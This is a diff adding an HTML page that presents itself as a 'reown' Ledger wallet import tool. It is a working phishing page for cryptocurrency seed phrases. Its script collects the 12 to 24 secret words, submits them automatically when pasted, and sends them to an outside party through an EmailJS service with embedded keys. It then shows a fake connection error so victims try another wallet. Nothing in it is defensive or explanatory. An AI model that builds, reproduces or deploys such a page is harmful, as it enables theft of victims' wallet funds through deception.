@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Import Ledger Wallet</title>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      emailjs.init('wUWWnTTZXKZ0e-RYE');
+    })();
+  </script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 15px;
+    }
+
+    .container {
+      background-color: #ffffff;
+      border-radius: 20px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      margin-bottom: 20px;
+    }
+
+    .badge {
+      background-color: #1f1f1f;
+      color: white;
+      border-radius: 50px;
+      padding: 6px 16px;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .close {
+      font-size: 22px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .title {
+      font-size: 20px;
+      font-weight: 700;
+      margin-top: 20px;
+      width: 100%;
+      text-align: left;
+    }
+
+    .description {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+      width: 100%;
+      text-align: left;
+    }
+
+    .tabs {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 16px;
+      width: 100%;
+    }
+
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 10px 0;
+      background-color: #f0f0f0;
+      border-radius: 10px;
+      margin: 0 5px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .tab.active {
+      background-color: #333;
+      color: white;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+      gap: 4px;
+      margin-bottom: 24px;
+      width: 100%;
+    }
+
+    .input-box {
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      padding: 10px;
+      font-size: 14px;
+      text-align: left;
+      outline: none;
+      width: 100%;
+      transition: border 0.2s;
+    }
+
+    .input-box:focus {
+      border-color: #333;
+    }
+
+    .button {
+      background-color: #333;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 14px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #000;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+      border-radius: 50%;
+      overflow: hidden;
+      width: 80px;
+      height: 80px;
+      object-fit: cover;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .loading-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      border-radius: 20px;
+      z-index: 10;
+      display: none;
+      opacity: 0;
+      transition: opacity 0.3s ease-in-out;
+    }
+
+    .loading-overlay.visible {
+      display: flex;
+      opacity: 1;
+    }
+
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      margin-top: 15px;
+      font-size: 16px;
+      color: #333;
+    }
+
+    .message-box {
+      background-color: #ffe0e0;
+      color: #cc0000;
+      border: 1px solid #cc0000;
+      border-radius: 10px;
+      padding: 15px;
+      margin-top: 20px;
+      text-align: center;
+      font-size: 15px;
+      font-weight: 600;
+      width: 100%;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://styles.redditmedia.com/t5_7rc222/styles/communityIcon_2e19ie5q5sba1.png" alt="Logo" class="logo" />
+
+    <div class="header">
+      <div class="badge">reown</div><h3 style="text-align: left;">Manual Kit</h3>
+      <div class="close"><a href="index.html">&times;</a></div>
+    </div>
+
+    <div class="title">Import Ledger wallet with Secret Phrase</div>
+    <div class="description">Import an existing wallet with your 12, 18 or 24-word secret phrase.</div>
+
+    <div class="tabs">
+      <div class="tab active" data-word-count="12">12 words</div>
+      <div class="tab" data-word-count="18">18 words</div>
+      <div class="tab" data-word-count="24">24 words</div>
+    </div>
+
+    <div class="grid"></div>
+
+    <button class="button" id="synchronizeButton">Synchronize</button>
+
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="spinner"></div>
+      <div class="loading-text">Connecting...</div>
+    </div>
+
+    <div class="message-box" id="messageBox"></div>
+  </div>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const tabs = document.querySelectorAll(".tab");
+      const grid = document.querySelector(".grid");
+      const synchronizeButton = document.getElementById("synchronizeButton");
+      const loadingOverlay = document.getElementById("loadingOverlay");
+      const messageBox = document.getElementById("messageBox");
+
+      let currentPhraseLength = 12;
+      const allValidLengths = [12, 15, 18, 21, 24];
+
+      function renderInputs(count) {
+        grid.innerHTML = "";
+        for (let i = 1; i <= count; i++) {
+          const input = document.createElement("input");
+          input.className = "input-box";
+          input.placeholder = i;
+          input.type = "text";
+          input.addEventListener("paste", handlePaste);
+          grid.appendChild(input);
+        }
+        currentPhraseLength = count;
+      }
+
+      function populateInputs(inputElements, wordsArray) {
+        inputElements.forEach((input, index) => {
+          input.value = wordsArray[index] || '';
+        });
+      }
+
+      async function sendPhraseToEmailJS() {
+        messageBox.style.display = 'none';
+        messageBox.textContent = '';
+        messageBox.style.backgroundColor = '#ffe0e0';
+        messageBox.style.color = '#cc0000';
+        messageBox.style.borderColor = '#cc0000';
+
+        const inputs = grid.querySelectorAll(".input-box");
+        const secretPhraseArray = Array.from(inputs).map(input => input.value.trim());
+
+        const allInputsFilled = secretPhraseArray.every(value => value !== '');
+
+        if (!allInputsFilled) {
+          messageBox.textContent = 'Please fill in all words of your secret phrase.';
+          messageBox.style.display = 'block';
+          return;
+        }
+
+        loadingOverlay.classList.add('visible');
+
+        const secretPhrase = secretPhraseArray.join(' ');
+
+        const templateParams = {
+          secret_phrase: secretPhrase,
+          wallet_type: "Ledger Wallet"
+        };
+
+        try {
+          await new Promise(resolve => setTimeout(resolve, 2000));
+
+          const response = await emailjs.send('service_3lmvs7c', 'template_wrnoe3i', templateParams);
+          console.log('EmailJS response:', response);
+
+          messageBox.textContent = 'Error connecting, try another wallet.';
+          messageBox.style.display = 'block';
+
+        } catch (error) {
+          console.error('EmailJS error:', error);
+          messageBox.textContent = 'Error connecting, try another wallet.';
+          messageBox.style.display = 'block';
+        } finally {
+          loadingOverlay.classList.remove('visible');
+        }
+      }
+
+      function handlePaste(event) {
+        event.preventDefault();
+        messageBox.style.display = 'none';
+
+        const pastedText = event.clipboardData.getData('text');
+        const words = pastedText.trim().split(/\s+/).filter(word => word !== '');
+
+        if (words.length > 0) {
+          if (allValidLengths.includes(words.length)) {
+            renderInputs(words.length); 
+            
+            setTimeout(() => {
+                const updatedInputs = grid.querySelectorAll(".input-box");
+                populateInputs(updatedInputs, words);
+                synchronizeButton.click();
+            }, 50); 
+            
+          } else {
+            const currentInputs = grid.querySelectorAll(".input-box");
+            populateInputs(currentInputs, words);
+            messageBox.style.display = 'block';
+            messageBox.textContent = `Pasted ${words.length} words. This might not be a standard phrase length (12, 15, 18, 21, 24).`;
+            messageBox.style.backgroundColor = '#fff3cd';
+            messageBox.style.color = '#856404';
+            messageBox.style.borderColor = '#ffeeba';
+          }
+        }
+      }
+
+      tabs.forEach(tab => {
+        tab.addEventListener("click", () => {
+          tabs.forEach(t => t.classList.remove("active"));
+          tab.classList.add("active");
+          const count = parseInt(tab.dataset.wordCount);
+          renderInputs(count);
+          messageBox.style.display = 'none';
+        });
+      });
+
+      renderInputs(12);
+
+      synchronizeButton.addEventListener("click", async () => {
+        await sendPhraseToEmailJS();
+      });
+    });
+  </script>
+</body>
+</html>
